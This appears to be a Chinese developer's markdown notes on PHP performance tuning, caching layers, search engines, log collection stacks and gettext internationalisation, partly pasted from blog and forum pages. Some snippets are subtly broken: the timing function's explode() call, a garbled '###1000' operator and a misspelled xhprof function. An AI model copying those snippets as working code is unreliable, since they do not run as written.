当有更改文件时，执行一下这个文件即可

<?php
// as: change.php
opcache_reset();
opcache_invalidate('文件路径', true); // 立即重新编译,可以用绝对路径
```


### php性能优化
```
php语言级的性能优化
优化点：少写代码，多用php自身能力
- 性能问题：自身代码冗余较多，可读性不佳，并且性能低。
- 为什么性能低：php代码需要编译解析为底层语言，这一过程每次请求都会处理一遍，开销大。
- 解决方案：多用php内置变量、常量、函数
- 测试方法：直接使用ab对比

优化点：php内置函数的性能优劣
- 性能问题：php内置函数，之间依然存在快慢差异
- 解决方案：多去了解php内置函数的时间复杂度
- 测试方法：对比isset()和array_key_exists()的性能差异
<?php
    $start = current_time();
    $i = 0;
    $arr = range(1, 200000);
    while($i<200000){
        ++$i;
        //isset($arr[$i]);
        array_key_exists($i,$arr);
    }
    $end = current_time();
    echo "Lost Time:". number_format($end-$start,3)###1000;
    echo "\n";
    function current_time(){
        list($usec, $sec) = explode(" ".microtime());
        return ((float)$usec + (float)$sec);
    }
?>
优化点：尽可能少用魔法函数
- 情况描述：php提供的魔法函数，性能不佳
- 为什么性能低：为了给php程序员省事，php语言为你做了很多
- 解决方案：尽可能规避使用魔法函数
- 测试方法：time php test.php
    - time  liunx命令
    - php 指定程序
    - test.php 指定文件 
    > 注意：php主要在返回值中看user耗时

优化点：产生额外开销在错误抑制符
- 情况描述：php提供的错误抑制符只是为了方便懒人
- @的实际逻辑：在代码开始前，结束后，增加Opcode,忽略报错
    vld php Opcode查看扩展:用于将Opcode显示出来
- 解决方案：尽量不要使用@错误抑制符
- 测试方法：php -dvld.active=1 -dvld.execute=0 at.php
    
- php 执行php的vld显示Opcode
    
优化点：避免在循环内做运算
- 情况描述：循环内在函数或运算会被重复执行
- 解决方案：在循环外获取需要在值，再给循环操作

优化点：减少计算密集型业务
- 情况描述：php不适合密集型的场景
- 为什么：php语言特性决定php不适合做大数据业务
- php适合场景：适合衔接webserver与sql

优化点：务必使用带引号字符串做键值
- 情况描述：php会将没有引号的键值当作常量，产生查找常量在开销。
- 解决方案：严格使用带引号作为键值

php周边问题的性能优化
- php周边有什么:
    - linux运行环境
    - 文件存储  硬盘
    - 数据库    mysql
    - 缓存      redis
    - 网络  

优化点：减少文件类操作
- 常见php场景在开销次序
读写内存 << 读写数据库 << 读写磁盘 << 读写网络数据

优化点：优化网络请求
- 网络请求的坑：
    1. 对方接口的不确定因素
    2. 网络稳定性
- 如何优化网络请求：
    - 设置超时时间
    1. 连接超时 <200ms
    2. 读超时   <800ms
    3. 写超时   <500ms
    - 将串行请求并行化
    1. 使用curl_multi_###()
    2. 使用swoole扩展

优化点：压缩php接口输出
- 如何压缩：使用Gzip即可
- 压缩的利于弊：利于我们的数据输出，Client段能更快获取数据;弊端为会有额外的CPU开销

优化点：缓存重复计算内容
- 什么情况下坐输出内容缓存：多次请求，内容不变情况

重叠时间窗口思想===并行
旁路方案===并行

php语言自身分析、优化
 php性能分析

工具:XHPorf（源自FackBook的php性能分析工具）
实践：通过分析Wordpress程序，做优化。
使用: php --ri xhprof   查看版本
在入口文件index.php添加

xhprof_enable();

// ...

$data = xhporf_disable();
include_once "/var/www/html/xhprof_lib/utils/xhprof_lib.php";
include_once "/var/www/html/xhprof_lib/utils/xhprof_runs.php";
$objXhprofRun = new XHProfRuns_Default();
$run_id = $objXhprofRun->save_run($data,"test");
var_dump($run_id);
查看xhp目录查看相关信息
参数：
    runction_name   函数名
    calls   被调用在次数
    InclWallTime    当流程走到该函数，之前和现在这个函数处理在总耗时
    ExclWallTime    这个函数执行了多少微秒

其他工具推荐：
    ab  压力测试
    vld opcode代码分析

php性能瓶颈解决方案：
    Opcode Cache:php扩展APC等
    peci.php.net    php扩展网站
    使用php扩展解决复杂的业务
    Runtime优化:HHVM

 Apache Benchmark(ab)

> ab是由Apache提供的压力测试软件。安装apache服务器时会自带该压测软件
- 使用方法: ./ab -n1000 -c100 http://www.baidu.com/
    - -n 请求数
    - -c 并发数
    - http 压测目标地址
    - -h 帮助 

###*返回参数说明**
- Requests per second（每秒接受请求数尽可能多）
- Time per request（每秒请求在耗时尽可能少）
```

### 缓存
```
https://segmentfault.com/a/1190000019142897

SegmentFault
首页
问答
专栏
资讯
课程
活动
发现
搜索关键字

新亮
 2.4k
系统的讲解 - PHP 缓存技术
cdn缓存nosql缓存设计缓存php
发布于 2019-05-10
概述
缓存已经成了项目中是必不可少的一部分，它是提高性能最好的方式，例如减少网络I/O、减少磁盘I/O 等，使项目加载速度变的更快。

缓存可以是CPU缓存、内存缓存、硬盘缓存，不同的缓存查询速度也不一样（CPU缓存 > 内存缓存 > 硬盘缓存）。

接下来，给大家逐一进行介绍。

浏览器缓存
浏览器将请求过的页面存储在客户端缓存中，当访问者再次访问这个页面时，浏览器就可以直接从客户端缓存中读取数据，减少了对服务器的访问，加快了网页的加载速度。

强缓存
用户发送的请求，直接从客户端缓存中获取，不请求服务器。

根据 Expires 和 Cache-Control 判断是否命中强缓存。

代码如下：

header('Expires: '. gmdate('D, d M Y H:i:s', time() + 3600). ' GMT');
header("Cache-Control: max-age=3600"); //有效期3600秒
Cache-Control 还可以设置以下参数：

public：可以被所有的用户缓存（终端用户的浏览器/CDN服务器）
private：只能被终端用户的浏览器缓存
no-cache：不使用本地缓存
no-store：禁止缓存数据
协商缓存
用户发送的请求，发送给服务器，由服务器判定是否使用客户端缓存。

代码如下：

$last_modify = strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']);
if (time() - $last_modify < 3600) {
    header('Last-Modified: '. gmdate('D, d M Y H:i:s', $last_modify).' GMT');
    header('HTTP/1.1 304'); //Not Modified
    exit;
}
header('Last-Modified: '. gmdate('D, d M Y H:i:s').' GMT');
用户操作行为对缓存的影响
操作行为	Expires	Last-Modified
地址栏回车	有效	有效
页面跳转	有效	有效
新开窗口	有效	有效
前进/后退	有效	有效
F5刷新	无效	有效
Ctrl+F5刷新	无效	无效
文件缓存
数据文件缓存
将更新频率低，读取频率高的数据，缓存成文件。

比如，项目中多个地方用到城市数据做三级联动，我们就可以将城市数据缓存成一个文件（city_data.json），JS 可以直接读取这个文件，无需请求后端服务器。

全站静态化
CMS（内容管理系统），也许大家都比较熟悉，比如早期的 DEDE、PHPCMS，后台都可以设置静态化HTML，用户在访问网站的时候读取的都是静态HTML，不用请求后端的数据库，也不用Ajax请求数据接口，加快了网站的加载速度。

静态化HTML有以下优点：

有利于搜索引擎的收录（SEO）
页面打开速度快
减少服务器负担
CDN缓存
CDN（Content Delivery Network）内容分发网络。

用户访问网站时，自动选择就近的CDN节点内容，不需要请求源服务器，加快了网站的打开速度。

缓存主要包括 HTML、图片、CSS、JS、XML 等静态资源。

NoSQL缓存
Memcached 缓存
Memcached 是高性能的分布式内存缓存服务器。

一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。

它也能够用来存储各种格式的数据，包括图像、视频、文件等。

Memcached 仅支持K/V类型的数据，不支持持久化存储。

Memcache 与 Memcached 的区别

Memcached 从0.2.0开始，要求PHP版本>=5.2.0，Memcache 要求PHP版本>=4.3。
Memcached 最后发布时间为2018-12-24，Memcache 最后发布时间2013-04-07。
Memcached 基于libmemcached，Memcache 基于PECL扩展。
可以将 Memcached 看作是 Memcache 的升级版。

PHP Memcached 使用手册：

http://www.php.net/manual/zh/...

Memcached 经常拿来与 Redis 做对比，接下来介绍下 Redis 缓存。

Redis缓存
Redis 是一个高性能的 K/V 数据库。

Redis 很大程度补偿了 Memcached K/V存储的不足，比如 List（链表）、Set（集合）、Zset（有序集合）、Hash（散列），既可以将数据存储在内存中，也可以将数据持久化到磁盘上，支持主从同步。

总的来说，可以将 Redis 看作是 Memcached 的扩展版，更加重量级，功能更强大。

Redis 在日常工作中使用的居多。

Redis 学习网址：http://www.redis.cn/

MongoDB缓存
MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。

旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。

MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。

MongoDB 学习网址：http://www.mongodb.org.cn

WEB服务器缓存
Apache缓存
利用 mod_expires ，指定缓存的过期时间，可以缓存HTML、图片、JS、CSS 等。

打开 http.conf，开启模块：

LoadModule expires_module modules/mod_expires.so
指定缓存的过期时间：

<IfModule expires_module>
     #打开缓存
     ExpiresActive on 

     #css缓存(8640000秒=10天)
     ExpiresByType text/css A8640000

     #js缓存
     ExpiresByType application/x-javascript A8640000
     ExpiresByType application/javascript A8640000

     #html缓存
     ExpiresByType text/html A8640000

     #图片缓存
     ExpiresByType image/jpeg A8640000
     ExpiresByType image/gif A8640000
     ExpiresByType image/png A8640000
     ExpiresByType image/x-icon A8640000

 </IfModule>
Nginx缓存
利用 expire 参数，指定缓存的过期时间，可以缓存HTML、图片、JS、CSS 等。

打开 nginx.conf ：

//以图片为例：
location ~\.(gif|jpg|jepg|png|bmp|ico)$ { #加入新的location
    root html;
    expires 1d; #指定缓存时间
}
大家也可以了解下：proxy_cache_path 和 proxy_cache，进行缓存的设置。

Opcode缓存
Opcode（Operate Code）操作码。

PHP程序运行完后，马上释放所有内存，所有程序中的变量都销毁，每次请求都要重新翻译、执行，导致速度可能会偏慢。

当解释器完成对脚本代码的分析后，便将它们生成可以直接运行的中间代码，也称为操作码。

操作码 的目地是避免重复编译，减少CPU和内存开销。

APC缓存
APC（Alternative PHP Cache）可选 PHP 缓存。

APC 的目标是提供一个自由、 开放，和健全的框架，用于缓存、优化 PHP 中间代码。

APC 可以去掉 php 动态解析以及编译的时间，使php脚本可以执行的更快。

APC 扩展最后的发布时间为 2012-09-03。

感兴趣可以了解下，官方介绍：http://php.net/manual/zh/book...

eAccelerator
eAccelerator：A PHP opcode cache。

感兴趣可以了解下，官方介绍：http://eaccelerator.net/

XCache
XCache 是一个又快又稳定的 PHP opcode 缓存器。

感兴趣可以了解下，官方介绍：http://xcache.lighttpd.net/

小结
文章主要简单的介绍了 浏览器缓存、文件缓存、NoSQL缓存、WEB服务器缓存、Opcode缓存。

每一种缓存都可以深入研究，从介绍 -> 安装 -> 使用 -> 总结应用场景。

大家可以思考下，通过上面的介绍，工作中我们使用了哪些缓存？

还可以再使用哪些缓存，可以对我们的项目有帮助？

关于缓存的常见问题
用过缓存，大家肯定遇到过比较头痛的问题，比如数据一致性，雪崩，热点数据缓存，缓存监控等等。

给大家列出几个问题，纯属抛转引玉。

当项目中使用到缓存，我们是选择 Redis 还是 Memcached ，为什么？
举一些场景：

一、比如实现一个简单的日志收集功能或发送大量短信、邮件的功能，实现方式是先将数据收集到队列中，然后有一个定时任务去消耗队列，处理该做的事情。

直接使用 Redis 的 lpush，rpop 或 rpush，lpop。

//进队列
$redis->lpush(key, value);

//出队列
$redis->rpop(key);
Memcached 没有这种数据结构。

二、比如我们要存储用户信息，ID、姓名、电话、年龄、身高 ，怎么存储？

方案一：key => value

key = user_data_用户ID

value = json_encode(用户数据)

查询时，先取出key，然后进行json_decode解析。

方案二：hash

key = user_data_用户ID

hashKey = 姓名，value = xx

hashKey = 电话，value = xx

hashKey = 年龄，value = xx

hashKey = 身高，value = xx

查询时，取出key即可。

//新增
$redis->hSet(key, hashKey, value);
$redis->hSet(key, hashKey, value);
$redis->hSet(key, hashKey, value);

//编辑
$redis->hSet(key, hashKey, value);

//查询
$redis->hGetAll(key); //查询所有属性
$redis->hGet(key, hashKey); //查询某个属性
方案二 优于 方案一。

三、比如社交项目类似于新浪微博，个人中心的关注列表和粉丝列表，双向关注列表，还有热门微博，还有消息订阅 等等。

以上都用 Redis 提供的相关数据结构即可。

四、Memcached 只存储在内存中，而 Redis 既可以存储在内存中，也可以持久化到磁盘上。

如果需求中的数据需要持久化，请选择 Redis 。

个人在工作中没有用到 Memcached ，通过查询资料得到 Memcached 内存分配时优于 Redis。

Memcached 默认使用 Slab Allocation 机制管理内存，按照预先规定的大小，将分配的内存分割成特定长度的块以存储相应长度的key-value数据记录，以完全解决内存碎片问题。

如何保证，缓存与数据库的数据一致性？
新增数据：先新增到数据库，再新增到缓存。

编辑数据：先删除缓存数据，再修改数据库中数据，再新增到缓存。

删除数据：先删除缓存数据，再删除数据库中数据。

查询数据：先查询缓存数据，没有，再查询数据库，再新增到缓存。

强一致性是很难保证的，比如事务一致性，时间点一致性，最终一致性等。

具体问题具体分析吧。

缓存穿透怎么办？
用户请求缓存中不存在的数据，导致请求直接落在数据库上。

一、设置有规则的Key值，先验证Key是否符合规范。

二、接口限流、降级、熔断，请研究 istio：https://istio.io/

三、布隆过滤器。

四、为不存在的key值，设置空缓存和过期时间，如果存储层创建了数据，及时更新缓存。

雪崩怎么办？
一、互斥锁，只允许一个请求去重建索引，其他请求等待缓存重建执行完，重新从缓存获取数据。

二、双缓存策略，原始缓存和拷贝缓存，当原始缓存失效请求拷贝缓存，原始缓存失效时间设置为短期，拷贝缓存设置为长期。

已上，纯属抛转引玉，结合自己的情况，具体问题，具体分析吧。

推荐阅读
系统的讲解 - SSO 单点登录
系统的讲解 - PHP WEB 安全防御
系统的讲解 - PHP 接口签名验证
系统的讲解 - PHP 浮点数高精度运算
一起学习


 
阅读 4k 更新于 3月25日
本作品系 原创， 采用《署名-非商业性使用-禁止演绎 4.0 国际》许可协议

新亮
 2.4k
0 条评论
得票时间

撰写评论 ...
推荐阅读
Java高并发架构设计
在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。

Java将军007  阅读 5.2k  27 赞  1 评论

大型网站技术架构-入门梳理
大型网站技术架构-入门梳理 标签 ： 架构设计 [TOC] 罗列了大型网站架构涉及到的概念，附上了简单说明 前言 本文是对《大型网站架构设计》(李智慧 著)一书的梳理，类似文字版的“思维导图” 全文主要围绕“性能，可...

brianway  阅读 3.5k  24 赞

大型分布式网站架构实战项目分析
distributed system is one in which components located at networked computers communicate and coordinate their actions only by passing messages（分布式系统是指位于网络计算机的组件仅通过传递消息来通...

bali  阅读 1.7k  19 赞  2 评论

深度解析大型分布式电商网站演变过程以及构架部署解决方案
本文是学习大型分布式网站架构的技术总结。对架构一个高性能，高可用，可伸缩，可扩展的分布式网站进行了概要性描述，并给出一个架构参考。一部分为读书笔记，一部分是个人经验总结。对大型分布式网站架构有很好...

bali  阅读 2.3k  16 赞

浅谈秒杀系统架构设计
秒杀是电子商务网站常见的一种营销手段。 原则 不要整个系统宕机。 即使系统故障，也不要将错误数据展示出来。 尽量保持公平公正。 实现效果 秒杀开始前，抢购按钮为活动未开始。 秒杀开始时，抢购按钮可以点击下...

新亮  阅读 4.8k  8 赞  2 评论

支撑千万级，大型电商分布式架构解析
大型分布式网站架构概述 1.1. 大型网站的特点用户多，分布广泛 大流量，高并发 海量数据，服务高可用 安全环境恶劣，易受网络攻击 功能多，变更快，频繁发布 从小到大，渐进发展 以用户为中心 免费服务，付费体验...

李红  阅读 637  6 赞

Java 应用一般架构
现在我们常见的不同系统不同语言之间的交互使用WebService，Http请求。WebService，即“Web 服务”，简写为 WS。从字面上理解，它其实就是“基于 Web 的服务”。而服务却是双方的，有服务需求方，就有服务提供方。服...

CODING  阅读 2.3k  3 赞  1 评论

Java 高并发环境下的性能优化，揭秘支付宝技术内幕
在电商相关产品开发的这些年，我有幸的遇到了并发下的各种坑，这一路摸爬滚打过来有着不少的血泪史，这里进行的总结，作为自己的归档记录，同时分享给大家。

Java高端架构师  阅读 276  2 赞

新亮笔记
用户专栏
技术的深度和广度只能靠自己努力去发掘，谁也不能替你学习，在这里希望你能有所收获。

934 人关注
74 篇文章

Planets
广告位促销，月曝光三千万，10 元/天
大厂进阶之路
BAT资深研发工程师带你丰富PHP技能树
Python3.x核心技术与实战
BAT 专家亲手教你真正的编程
前端晋升必备技能
iview核心开发者亲自教你Vue实战
2020 年新版 Springboot 2.3 教程
Spring5 / Mybatis / Vue / Cubeui
▶ 目录
后端知识库
产品
热门问答
热门专栏
热门课程
最新活动
技术圈
酷工作
移动客户端
课程
Java 开发课程
PHP 开发课程
Python 开发课程
前端开发课程
移动开发课程
资源
每周精选
用户排行榜
徽章
帮助中心
声望与权限
社区服务中心
合作
关于我们
广告投放
职位发布
讲师招募
联系我们
合作伙伴
关注
产品技术日志
社区运营日志
市场运营日志
团队日志
社区访谈
条款
服务条款
隐私政策
下载 App
Copyright © 2011-2020 SegmentFault.

浙ICP备 15005796号-2 浙公网安备 33010602002000号 杭州堆栈科技有限公司版权所有

   
请登录后复制

```

### 搜索解决方案
```

首页   注册   登录
V2EX = way to explore
V2EX 是一个关于分享和探索的地方
现在注册
已注册用户请  登录

 
F0urV2EX  ›  PHP
关于PHP搜索引擎和中文分词的解决方案的咨询
  1     F0ur · 2013-09-22 01:00:04 +08:00 · 5746 次点击
这是一个创建于 2518 天前的主题，其中的信息可能已经有所发展或是发生改变。
需要选择一个搜索引擎+中文分词的方案
查了一些资料，目前有3个方案
1.coreseek
基于sphinx+LibMMSeg
我唯一担心的是因为coreseek长期不更新,最新版用的还是sphinx 2.0.2 dev,会不会有什么问题

2.sphinx for chinese
基于sphinx+xdict
一样长期不更新，最新版用的sphinx 2.1.0 dev, 社区中关于分词系统也指出了一些不足

3.xunsearch
基于xapian+scws
更新稳定，但是无从下手，指南写的还是有些问题，当然，我还没去重点研究

因为我对这方面知识了解的不多，只能根据需求找到这3个解决方案，也无法着重做个对比或者选择
所以请懂行的大大们指点一下我，或者有更好的选择方案
先感谢下所有回复的诸位了
 sphinx 分词 最新版9 条回复  •  2014-09-10 09:56:38 +08:00
liuxurong		    1
liuxurong   2013-09-22 01:32:18 +08:00 via iPad
用 v2ex 方案就可以了
ted05		    2
ted05   2013-09-22 06:42:44 +08:00
信息检索这个挺难的，最近在学用java是怎么实现的。。。
angelface		    3
angelface   2013-09-22 06:48:58 +08:00 via iPhone
还是看你的需求，如果你只是做个站内搜索，google就挺好，如果你要对搜索结果进行控制，那就上面的三种随便选一个，然后深入研究
f489753		    4
f489753   2013-09-22 08:09:10 +08:00
目前在用sphinx，不过感觉xunsearch有前途。
当然也可以搞java方案嘛，lucene、slor之类也可以接上。
felix021		    5
felix021   2013-09-22 09:49:59 +08:00
小站的话xunsearch就很够用了，文档写得很全啊，有啥问题？

不过xunsearch的速度是硬伤，太慢了，千万级的数据量可能hold不住的感觉。
F0ur		    6
F0ur   2013-09-22 10:41:36 +08:00
@liuxurong v2ex方案是什么
@angelface google搜索还是不能满足需求，可能带有facet功能
@f489753 lucene、slor的话也可以考虑~我再去研究研究
@felix021 我也是觉得小站xunsearch够了，但是是商业站后期数据量肯定会上去的，所以想找个完全的解决方案
hfcorriez		    7
hfcorriez   2013-09-22 10:47:53 +08:00   ❤️ 1
可以试试ElasticSearch
Yuansir		    8
Yuansir   2013-09-22 13:02:45 +08:00   ❤️ 1
xunsearch 和 sphinx+coreseek 都用过，推荐xunsearch吧，文档齐全，性能不错，功能也强大，坑比较少，比较容易配置和使用
flyingxu		    9
flyingxu   2014-09-10 09:56:38 +08:00
@felix021 速度有多伤？能实现类似stackoverflow提问题时及时搜索类似问题吗？

 
关于   ·   FAQ   ·   API   ·   我们的愿景   ·   广告投放   ·   感谢   ·   实用小工具   ·   2542 人在线   最高记录 5168   ·      Select Language
创意工作者们的社区
World is powered by solitude
VERSION: 3.9.8.5 · 23ms · UTC 13:38 · PVG 21:38 · LAX 06:38 · JFK 09:38
♥ Do have faith in what you're doing.

```

### 各维度监控方案
```
https://www.zhihu.com/question/37585246

```

### 日志收集集中处理方案
```
https://www.jianshu.com/p/e3ccb75bd813
随着业务的快速发展，各种服务和组件也要随着增加或扩容，服务器的台数随之增加，这样给日志运维带来很大的问题。如果你要查阅某个项目的日志，服务器数十上百台的话，这将是一件非常繁琐和低效的事。另外，如果你想对这些日志进行实时的分析统计，也无从下手。因此，我们需要一种数据收集框架，它可以将不同服务器上的日志数据，高效地收集汇总在一起，供在线或者离线查阅和分析，并且还可以对系统实施监控和故障告警。

本文档通过介绍Flume NG、Scribe、Kafka、Chukwa和ELK的特点，结构模型，使用时的优势和劣势，以及我们自定义的指标项对比，最后得出它们各自的应用场景，为框架选型提供技术参考。

数据收集系统
Flume NG
Flume NG的介绍
Flume NG 是Cloudera提供的分布式数据收集系统，它能够将不同数据源的海量日志数据进行高效的收集、聚合、移动，最后存储到存储中心。Flume NG支持（故障转移）failover和负载均衡。

Flume NG的结构
Flume NG传输数据的基本单元是event，如果是文件，通常是一行记录。运行的核心是Agent，包含三个核心组件，分别是Source、Channel和Sink，其结构模型图如下：

Flume NG的介绍
Source：接收外部源发送过来的数据，支持Avro、Thrift、JMS、Syslog、Kafka和Http post（自己代码实现）等多种方式的日志接收。提供ExecSource以tail -f等命令的方式实现实时日志收集；提供SpoolSource以读取新增的文件的方式实现低延时的日志收集。
Channel：是一个存储池，接收Source的输出。有MemoryChannel、JDBC Channel、MemoryRecoverChannel和FileChannel等主要类型。其中MemoryChannel可以实现高速吞吐，但无法保证数据的完整性。FileChannel能实现数据的完整性和一致性。Channel中的数据仅会在数据保存在下一个Channel或最终的存储中心时，才会被删除。
Sink：消费Channel中的数据，然后发送给数据存储系统（HDFS、Elasticsearch或者HBase等)。一个Agent可以存在多个Sink，Sink支持负载均衡和failover。
Flume NG的结构图：
多个Agent顺序连接：

最简单的部署方式，通过多个Agent连接，将原始数据传送到下一个Agent或者是最终的存储中心，适合初学者。

多个Agent顺序连接
多个Agent的数据汇聚在同一个Agent中：
多个Agent的数据汇聚在同一个Agent中
最常见的部署方式，比如在各个应用服务器上部署Flume NG，将原始数据同步到一台agent上。

多路Agent连接：
多路Agent连接
包括分流和复制两种方式，分流是根据header信息进行数据的分类存储数据，复制是将数据复制多份。

负载均衡数据模型：
负载均衡数据模型
Agent1负责路由，每个Sink连接一个Agent，Sink支持负载均衡和Failover。

Flume NG的优势劣势
优势：Flume NG通过事务保证数据的完整性和一致性；支持负载均衡；很容易进行水平扩展；社区活跃度高；文档资料比较丰富；依赖第三方库少；部署简单；支持多种存储系统。
劣势：Flume NG需要自己实现客户端代码；ExecSource方式会存在数据丢失的可能，SpoolSource方式做不到监控文件的新增记录；对数据的过滤能力较差。
Scribe
Scribe介绍
Scribe是Facebook开源的一个基于thrift框架的日志收集系统，在facebook内部已经得到大量的应用。Scribe可以从不同数据源，不同机器上收集日志，然后将它们存入存储中心，目前Facebook已停止对Scribe的更新和维护。

Scribe结构
Scribe结构图：
Scribe结构图
Scribe 客户端：需要自己基于Thrift框架实现，每条消息包含一个category和一个message信息，Scribe Server根据category将数据存储在不同的存储系统。
Scribe Server：根据配置，将各个category类型的日志发到不同的存储系统。Scribe Server收集到数据后，将数据放到共享队列，然后Push到存储中心，当存储中心出现故障时，Scribe 会将数据保存在本地文件中，待存储中心恢复后再Push数据。
存储中心：包括HDFS、File和Scribe。
Scribe优势和劣势
优势：具有很高的容错性；支持水平扩展；
劣势：依赖zookeeper或Hash等其他工具；需要自己实现客户端代码；社区活跃度低；文档资料极少；依赖第三方库多；部署较为复杂；存储系统类型较少；数据过滤解析能力差；Facebook公司已停止更新和技术支持。
Kafka
Kafka的介绍
Kafka 是一个基于分布式的消息系统，开发自 LinkedIn ['lɪŋktɪn]，作为 LinkedIn 的活动流和运营数据处理管道。活动流数据包括页面访问量、被查看内容方面的信息以及搜索情况等。运营数据指服务器的性能数据，包括CPU、IO使用率、请求时间、服务日志等。

Kafka结构模型：
Kafka结构模型
Producer：消息发送者，负责发送消息给Broker。
Kafka Cluster：由多个Kafka实例组成，每个实例（Server）成为Broker。集群的搭建依赖Zookeeper。
Consumer：消息消费者，从Kafka读取消息。
Topic：一类消息，类似Queue的概念，Topic在物理上是分节点存储。
Consumer Group：实现一个Topic消息单播和广播的一个手段。要实现广播，只要每个consumer有一个独立的Group就可以。要实现单播，只要所有的Consumer在同一个Group里即可。
Kafka的优势和劣势
Kafka 通过系统解耦、Partition（分片存储）、复制备份、持久化、缓存、集群和异步通信等策略提供了一个高性能、高可靠、可扩展的数据管道和消息系统。

优势：高性能；高可靠；通过Kafka Conenector对接HDFS、Elasticsearch、JDBC等其它系统；支持水平扩展；社区活跃度高；文档资料丰富；依赖第三方库较少。
劣势：依赖Zookeeper；需要自己实现客户端代码；数据过滤解析能力差。
Chukwa
Chukwa的介绍
chukwa 是一个用于监控大型分布式系统的数据收集系统，构建在 Hadoop 的 HDFS 和 map/reduce 框架之上的，继承了 hadoop 的扩展性和健壮性，还包含HICC，可用于展示、监控和分析已收集的数据。

Chukwa的结构
image.png
Agent：负责采集数据，并发送给Collector。agent采用“watchdog”的机制，自动重启终止的数据采集进程，防止数据丢失。
Adaptor：直接采集数据的接口和工具，支持命令行，log文件和httpSender输出,可以按自己的需求实现Adaptor，一个Agent可以管理多个Adaptor的数据采集。
Collectors：负责收集Agents发送过来的数据，并定时写入集群。
Map/Reduce jobs：定时启动，在此阶段，Chukwa提供了demux [dɪm'ju:ks]和archive [ˈɑ:kaɪv]两种内置的作业类型，其中，demux作为负责对数据分类、排序、去重，archive作业负责把同类型的数据合并。
HICC：负责数据的展示。
Chukwa的优势和劣势
优势：高可靠，易扩展；社区活跃度较高；文档资料较丰富；
劣势：依赖hadoop。
ELK
ELK的介绍
ELK 不是一款软件，而是Elasticsearch、Logstash和Kibana首字母的缩写。这三者是开源软件，通常配合一起使用，而且先后归于Elasic.co公司的名下，所以简称ELK Stack。根据Google Trend的信息显示，ELK已经成为目前最流行的的集中式日志解决方案。

Elasticsearch：是一个分布式搜索和分析引擎，具有高可伸缩、高可靠和易管理等特点。基于Apache Lucene构建，能对大容量的数据进行接近实时的存储、搜索和分析操作。通过简单的配置，Elasticsearch就会帮你管理集群、分片、故障转移、主节点选举等，还提供集群状态的监控接口。

Logstash：数据收集引擎。它支持从各种数据源收集数据，并对数据进行过滤、分析、丰富、统一格式等操作，然后存储到用户指定的位置。Logstash支持file、syslog、tcp、stdin、redis和kafka等多种接收方式。支持elasticrsearch、email、exec、nagios、tcp、hdfs等多种方式输出。

Kibana：数据分析和可视化平台。通常与Elasticsearch配合使用，对其中的数据进行搜索、分析并能以图表的方式显示。

Filebeat：ELK协议栈的新成员，一个轻量级开源日志文件数据搜集器。我们在需要采集日志数据的服务器上安装Filebeat，并指定日志目录或日志文件后，Filebeat就能读取数据，迅速发送到Logstash进行解析，亦或直接发送到Elasticsearch进行集中式存储和分析。FileBeat可以监听指定目录下是否新增文件，监听文件是否新增记录，文件在一定时间内没更新取消监听，支持批量数据传送，支持负载均衡的方式传送数据到Logstash或Elasticsearch。支持SSL/TLS协议传送。

ELK的结构
最简单的结构模型：
最简单的结构模型
这种结构很简单，适合初学者。初学者可以搭建此结构，了解ELK如何工作。

Logstash作为日志收集器：
Logstash作为日志收集器
这种结构模型需要在各个应用服务器上部署Logstash，但Logstash比较消耗CPU和内存资源，所以比较适合资源丰富的服务器，否则可能会导致应用服务器无法工作。

Beats作为日志收集器，Beats包括四种：
Packetbeat(搜集网络流量数据)
Topbeat(搜集系统、进程、文件系统级别的CPU和内存使用情况等数据)
Filebeat(收集文件数据)
Winlogbeat(收集Window时间日志数据)
Beats作为日志收集器
这种结构解决了Logstash在各服务器节点上占用资源高的问题。另外，数据格式规范的情况下，可以移出Logstash节点,Beats直接发送数据到Elasticsearch，解决Logstash占用资源高的问题。

引入消息队列机制
引入消息队列机制
这种结构适合日志规模比较大的情况。引入消息队列，将上下游服务解耦，减轻下游服务的压力，解决在巨量日志下，网络阻塞延迟、数据丢失的问题，使得网络传输更稳定、更高效，避免级联效应。在巨量日志的情况下，Logstash节点和Elasticsearch节点负荷比较重，可将它们配置成集群模式，分担负荷。在日志比较规范的情况下，可以去掉Logstash,Beats直接发送数据到Elasticsearch，解决Logstash占用资源高的问题。

ELK的优势和劣势
优势：提供一套完整的日志收集、分析、存储和数据展示的解决方案；Logstash支持集群部署和水平扩展；Elasticsearch高可用，支持集群部署和水平扩展；社区活跃度高；文档资料较丰富；部署简单。
劣势：Logstash占用资源比较高。
指标项对比
指标项对比
结论
结论
ELK告警策略
ELK告警策略
参考资料
Flume NG
http://blog.csdn.net/zhaodedong/article/details/52541688
http://www.gegugu.com/2016/04/11/5484.html

Scribe
http://www.itdadao.com/articles/c15a502872p0.html
http://www.36dsj.com/archives/66047

Kafka
http://www.cnblogs.com/likehua/p/3999538.html
http://www.infoq.com/cn/articles/kafka-analysis-part-1

Chukwa
http://www.it165.net/admin/html/201403/2507.html
http://f.dataguru.cn/thread-97612-1-1.html

ELK Stack 中文指南
http://kibana.logstash.es/content/

Logstash最佳实践
http://udn.yyuap.com/doc/logstash-best-practice-cn/index.html

Elasticsearch 权威指南
https://es.xiaoleilu.com/

Elasticsearche配置：
https://my.oschina.net/topeagle/blog/405149
https://my.oschina.net/Yumikio/blog/805877

Filebeat配置：
http://m.blog.csdn.net/article/details?id=53584173
http://michaelkang.blog.51cto.com/1553154/1864225

Search Guard:
https://github.com/floragunncom/search-guard-docs
http://www.cnblogs.com/Orgliny/p/6168986.html
http://kibana.logstash.es/content/elasticsearch/auth/searchguard-2.html

```

### 国际化
```
php程序的国际化实现方法（利用gettext）
 更新时间：2011年08月14日 13:11:59   转载 作者：  
这里我们主要介绍window平台下使用php的扩展gettext实现程序的国际化。

 
步骤一：搭建环境
1，首先查看你的php扩展目录下是否有php_gettext.dll这个文件，如果没有，这就需要你
下载一个或是从其他地方拷贝一个，然后放到php扩展目录。
2，打开php.ini，查找”;extension=php_gettext.dll“ ，然后去除注释，重启apache。
步骤二:原理讲解
假如你的没有国际化的程序里有这样的代码，echo "你好";,而国际化的程序你要写成
echo gettext("你好");，然后再在配置文件里添加“你好”相对应的英文“Hi”。
